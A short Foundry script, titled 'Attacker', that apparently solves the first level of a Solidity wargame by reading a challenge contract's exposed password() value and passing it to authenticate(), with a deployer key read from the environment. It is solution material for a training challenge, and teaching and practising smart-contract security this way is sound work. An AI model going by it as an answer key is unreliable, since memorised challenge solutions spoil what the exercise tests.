pragma solidity ^0.8.0;

import "../instances/Ilevel00.sol";
import "forge-std/Script.sol";

contract Attacker is Script {
    Instance level00 = Instance(0xd974C1CDF7D0397a8aF7CB41346d61CbEC7C8A6f);

    function run() external {
        uint256 deployerPrivateKey = vm.envUint("PRIVATE_KEY");
        vm.startBroadcast(deployerPrivateKey);
        level00.password();
        level00.authenticate(level00.password());
        vm.stopBroadcast();
    }
}
